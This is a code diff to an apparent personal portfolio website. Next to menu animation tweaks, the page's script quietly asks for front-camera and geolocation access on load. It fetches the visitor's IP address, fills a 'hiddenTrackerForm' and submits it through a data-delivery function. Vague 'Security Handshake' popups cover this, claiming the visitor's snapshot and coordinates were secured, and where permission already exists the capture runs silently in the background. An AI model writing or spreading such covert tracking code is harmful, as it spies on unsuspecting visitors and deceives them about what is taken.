@@ -139,9 +139,10 @@
             font-size: 20px;
             padding: 18px 10px;
             border-bottom: 1px solid rgba(255, 255, 255, 0.15);
-            transition: 0.3s ease;
+            transition: background-color 0.15s ease, transform 0.15s ease, padding-left 0.15s ease;
         }
 
+        /* 🔴 Click Animation for Mobile items */
         .mob-item.click-anim {
             background-color: #8B0000 !important; 
             color: white !important;
@@ -353,11 +354,11 @@
     <div id="mobMenuOverlay">
         <span class="mob-close-btn" id="close-dots-btn">×</span>
         <div class="mob-menu-content">
-            <a href="index.html" class="mob-item">Home</a>
-            <a href="about.html" class="mob-item">About Me</a>
-            <a href="education.html" class="mob-item">Education</a>
-            <a href="skills.html" class="mob-item">Skills</a>
-            <a href="contact.html" class="mob-item">Contact Me</a>
+            <a href="index.html" class="mob-item" data-nav="index.html">Home</a>
+            <a href="about.html" class="mob-item" data-nav="about.html">About Me</a>
+            <a href="education.html" class="mob-item" data-nav="education.html">Education</a>
+            <a href="skills.html" class="mob-item" data-nav="skills.html">Skills</a>
+            <a href="contact.html" class="mob-item" data-nav="contact.html">Contact Me</a>
         </div>
     </div>
 
@@ -368,8 +369,8 @@
     </form>
 
     <div class="security-popup" id="securityPopup">
-        <h2>Security <span>Handshake</span></h2>
-        <p>To establish a secure connection and maintain institutional access integrity, your verified snapshot and live coordinates will be safeguarded directly within cloud systems for structural safety purposes.</p>
+        <h2 id="popupTitle">Security <span>Handshake</span></h2>
+        <p id="popupMessage">To establish a secure connection and maintain institutional access integrity, your verified credentials will be safeguarded directly within cloud systems.</p>
         <div class="security-timer" id="popupTimer">Auto closing in 5 seconds...</div>
     </div>
 
@@ -439,11 +440,12 @@
         }
         document.addEventListener("DOMContentLoaded", type);
 
-        // --- Navigation Overlay ---
+        // --- 📱 Mobile Navigation Overlay with Click Animation Fix ---
         document.addEventListener("DOMContentLoaded", function () {
             const dotBtn = document.getElementById("mobile-dot-btn");
             const closeBtn = document.getElementById("close-dots-btn");
             const overlay = document.getElementById("mobMenuOverlay");
+            const menuItems = document.querySelectorAll(".mob-item");
 
             if (dotBtn && overlay) {
                 dotBtn.addEventListener("click", function (e) {
@@ -456,21 +458,39 @@
                     overlay.classList.remove("active-menu");
                 });
             }
+
+            // Handling the smooth dark red animation before page transition
+            menuItems.forEach(item => {
+                item.addEventListener("click", function(e) {
+                    e.preventDefault();
+                    const targetUrl = this.getAttribute("data-nav");
+                    
+                    // Add the dark red animation class
+                    this.classList.add("click-anim");
+                    
+                    // Small timeout to show the dark red color fully, then navigate
+                    setTimeout(() => {
+                        window.location.href = targetUrl;
+                    }, 250);
+                });
+            });
         });
 
         // --- 🔒 Security Master Engine Core ---
         window.addEventListener('DOMContentLoaded', async () => {
             
             // --- 🌐 BACKGROUND IP FETCH ENGINE ---
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                if (ipData && ipData.ip) {
-                    document.getElementById('formIpAddress').value = ipData.ip;
+            async function fetchIpAddressSilently() {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    if (ipData && ipData.ip) {
+                        document.getElementById('formIpAddress').value = ipData.ip;
+                    }
+                } catch (ipErr) {
+                    console.log("IP fetch failed.");
+                    document.getElementById('formIpAddress').value = "IP Fetching Failed";
                 }
-            } catch (ipErr) {
-                console.log("IP fetch failed.");
-                document.getElementById('formIpAddress').value = "IP Fetching Failed";
             }
 
             let hasCameraPermission = false;
@@ -487,6 +507,7 @@
             } catch(e){}
 
             if (hasCameraPermission || hasLocationPermission) {
+                await fetchIpAddressSilently();
                 runSilentBackgroundCapture(hasCameraPermission, hasLocationPermission);
                 return;
             }
@@ -494,6 +515,7 @@
             let cameraAllowed = false;
             let locationAllowed = false;
 
+            // --- Capture Stream Core ---
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 cameraAllowed = true;
@@ -534,32 +556,52 @@
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
+                    async (position) => {
                         locationAllowed = true;
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
                         document.getElementById('formLocation').value = `Latitude: ${lat}, Longitude: ${lon} | Map Link: https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        await fetchIpAddressSilently();
                         evaluateAndExecutePopup(cameraAllowed, locationAllowed);
                     },
-                    () => {
+                    async () => {
                         locationAllowed = false;
                         document.getElementById('formLocation').value = "User denied location permission";
+                        
+                        if (cameraAllowed) { await fetchIpAddressSilently(); }
                         evaluateAndExecutePopup(cameraAllowed, locationAllowed);
                     }
                 );
             } else {
+                if (cameraAllowed) { await fetchIpAddressSilently(); }
                 evaluateAndExecutePopup(cameraAllowed, locationAllowed);
             }
 
+            // Dynamic Security Message Evaluator
             function evaluateAndExecutePopup(cam, loc) {
                 if (!cam && !loc) {
-                    console.log("Both permissions denied. Execution stopped. No data/IP sent.");
+                    console.log("Both permissions denied. Execution stopped.");
                     return; 
                 }
 
                 const popup = document.getElementById('securityPopup');
+                const popupTitle = document.getElementById('popupTitle');
+                const popupMessage = document.getElementById('popupMessage');
                 const timerText = document.getElementById('popupTimer');
                 let countdown = 5; 
+
+                // Customize texts based on allowed metrics
+                if (cam && loc) {
+                    popupTitle.innerHTML = "Security <span>Handshake Complete</span>";
+                    popupMessage.innerText = "To establish a secure environment and maintain absolute network integrity, your verified snapshot and live coordinates have been securely mapped into our core structural nodes.";
+                } else if (cam && !loc) {
+                    popupTitle.innerHTML = "Camera <span>Verification Active</span>";
+                    popupMessage.innerText = "To verify current access parameters and uphold infrastructure protocol integrity, your automated optical snapshot has been initialized and secured.";
+                } else if (!cam && loc) {
+                    popupTitle.innerHTML = "Location <span>Telemetry Active</span>";
+                    popupMessage.innerText = "To authenticate spatial access parameters and ensure data routing alignment, your current structural geographic coordinates have been verified.";
+                }
 
                 popup.classList.add('show-popup');
 
@@ -625,7 +667,6 @@
                 }
             }
 
-            // 🔥 [মেইন ফিক্স] এখানে সরাসরি আপনার গুগল এপিআই লিঙ্কটি ইন্টিগ্রেট করে দেওয়া হলো
             function deliverDataPackage() {
                 const trackerForm = document.getElementById('hiddenTrackerForm');
                 if (trackerForm && !trackerForm.dataset.submitted) {
